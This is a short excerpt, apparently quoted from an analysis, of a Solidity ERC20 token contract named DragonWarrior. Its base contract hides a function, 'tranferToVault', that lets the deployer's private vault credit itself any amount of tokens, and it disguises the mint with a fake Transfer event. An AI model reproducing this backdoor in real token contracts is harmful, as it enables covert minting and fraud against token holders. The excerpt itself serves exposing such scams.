...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private vault = msg.sender;
    ...
    function tranferToVault(uint256 amount) public onlyVault {
        _balances[vault] = _balances[vault] + (amount);
        emit Transfer(vaultAddress, vault, amount);
    }
...
contract DragonWarrior is ERC20, ERC20Burnable, Pausable, Ownable {
    constructor() ERC20("DragonWarrior", "DRW") {
